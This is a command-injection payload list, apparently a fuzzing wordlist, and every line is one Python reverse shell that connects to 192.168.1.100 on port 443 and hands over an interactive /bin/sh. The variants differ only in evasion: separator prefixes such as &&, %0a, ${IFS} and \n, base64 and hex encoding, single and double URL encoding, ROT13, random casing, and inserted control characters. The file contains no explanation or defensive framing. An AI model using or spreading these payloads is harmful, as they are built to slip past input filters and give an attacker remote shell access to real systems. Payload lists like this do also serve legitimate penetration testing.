+JiYgcHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjEwMCIsNDQzKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=
+262620707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+&& clguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+&& PythON3 -C 'ImPORt sOcKet,SuBprOCESs,OS; S=SOckeT.SockEt(sOCkEt.Af_InET,SOCKet.SOCk_StreAM); S.COnNecT(("192.168.1.100",443)); OS.duP2(s.fiLeNo(),0); OS.dUp2(S.fiLeNO(),1); os.DuP2(S.FilEnO(),2); SubProCesS.Call(["/BIn/sh","-I"])'
+&& py%0atho%0dn3 -c 'import socket,subpr%0doces%0ds,%0cos; %20s=sock%0det.socket(socket.A%00F_INET%09,socket.SOCK_STREAM%20); s.connect(("192.%0c168.1%0d.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(%0c),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/s%09h"%09,"-i"])'
+%0apython3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%250apython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%25250apython3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+JTBhcHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjEwMCIsNDQzKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=
+253061707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+%0nclguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+%0aPythoN3 -c 'Import socKeT,SubproCeSs,Os; S=SockET.sOcKeT(sOCkeT.Af_iNEt,sOCKET.sOcK_StrEam); S.cOnnecT(("192.168.1.100",443)); Os.DUp2(S.FILENO(),0); OS.Dup2(s.fiLeNO(),1); os.DUp2(S.fiLENo(),2); SUbProCesS.call(["/BiN/sH","-I"])'
+%0b%0apytho%20n3 -c 'import soc%0cke%20t,subprocess%20,os; s=socket.socket(socke%0at.AF_INET,socket.SOCK%09_%00STREAM)%0a; s.connect(%00("19%202.16%0d8.1.100",443%0c)); os.dup2(s.file%20no(),0); os.dup2(s.fileno(%0a),1); os.%20dup2(s%00.f%0bileno(),2); su%0cb%0aproce%00ss.call(["/bin/sh","-i"])'
+%0Apython3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%250Apython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%25250Apython3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+JTBBcHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjEwMCIsNDQzKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=
+253041707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+%0Nclguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+%0apYtHoN3 -C 'ImpoRT soCKeT,subProcEss,OS; S=sOCKET.SocKeT(sOcKeT.af_ineT,sOckET.Sock_StrEAM); S.coNNeCT(("192.168.1.100",443)); OS.dUP2(S.fILENo(),0); os.dUP2(S.FiLeNo(),1); oS.dUP2(S.fIleNo(),2); SuBPRoCeSS.cAll(["/bIN/sH","-I"])'
+%%000Apython3 -c 'imp%0bor%0dt s%0coc%20ke%0ct,%0dsubprocess,os; s=socket.socket(socket.AF_INET,socket.S%0cOCK_STR%00EA%20M); s.conne%0cct(("192.168.1.100",443)); os.dup2(s.%0dfileno(%0b),0%0b); os.%0adup2(s.fi%09len%00o(),1); os.dup2(s.fileno(),2);%0b %00subprocess.%0dcall(["/bi%00n/sh","-i"])'
+${IFS}python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%24%7BIFS%7Dpython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%2524%257BIFS%257Dpython3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+JHtJRlN9cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjEwMCIsNDQzKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=
+247b4946537d707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+${VSF}clguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+${IfS}PYthoN3 -c 'impOrT SOCkET,SUBPrOcEsS,oS; s=SoCket.SOcket(sOcKEt.af_iNEt,SoCKET.sOCk_StrEAM); s.CoNnECt(("192.168.1.100",443)); oS.DUP2(s.fileNo(),0); Os.dUP2(s.FiLeNo(),1); oS.DUp2(s.fIlENo(),2); suBpRoCEss.caLl(["/bIn/sH","-I"])'
+${I%09FS}python%0b3 -%0cc 'imp%0cor%0bt socket,sub%0dprocess,%00os;%0a s=socket.so%0ccket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168%09.1.100",%00443%0c)); os.dup2(s.filen%09o(),0); os.%00d%0aup2%20(s.fileno(),1); os.dup2(s.fileno(),2); subp%00rocess.call(["/bin/%0ash","%0b-%20i"])'
+\npython3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%5Cnpython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%255Cnpython3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+XG5weXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7IHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pOyBzLmNvbm5lY3QoKCIxOTIuMTY4LjEuMTAwIiw0NDMpKTsgb3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTsgc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pJw==
+5c6e707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+\aclguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+\nPYThON3 -c 'imPorT sOCket,suBPROcEsS,Os; s=SoCkeT.sOCkET(SoCKET.aF_inET,socKet.sOCk_STREam); S.CONNECt(("192.168.1.100",443)); os.duP2(S.fIleNo(),0); os.DuP2(S.FIlenO(),1); os.duP2(S.filEno(),2); SUbprOCeSs.CalL(["/Bin/sH","-i"])'
+\%00npyt%0dhon3 -%0bc '%0di%0amport socket,subproce%00ss,os; s=socket.socket(so%09cke%0bt.%00AF_INET%00,so%0dcket%0d.SOCK%09_STREAM); s.%20connect(("192.168.1.1%2000",443)); os.%09dup2(%20s.fileno(),0)%00; os.dup2%20(s.filen%0ao%00(),1);%0d o%00s.dup2(s.fileno(),2); %09subpr%0cocess.call%20(["/bin/sh"%20,"-i"])'
+python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+python3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjEwMCIsNDQzKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=
+707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+clguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+PYThON3 -C 'ImPOrt SOcket,SUBPRoceSs,os; s=sOCkET.SockeT(soCKeT.Af_inet,SocKEt.socK_sTReAM); S.ConNecT(("192.168.1.100",443)); os.duP2(s.fILENO(),0); oS.DUP2(S.FILEnO(),1); OS.Dup2(s.FIlENo(),2); sUBprOCEsS.CALl(["/biN/sh","-I"])'
+python3 -c%0d 'impo%0art socket,%09subproces%0ds,os; s=socket.s%0cocket(socket.%0cAF_INET,socket.%0bSOC%09K%0c_STREAM);%00 s.connect(("1%0d92%00.168.%0b1.100",443%00));%00 os.dup2(%0bs.%09fileno(),0); %09os.%0cdup2%0c(s.fileno(),1%20); o%0ds.dup2(s.filen%0do(),2); subprocess.call(["/bin/sh","-i%00"])'
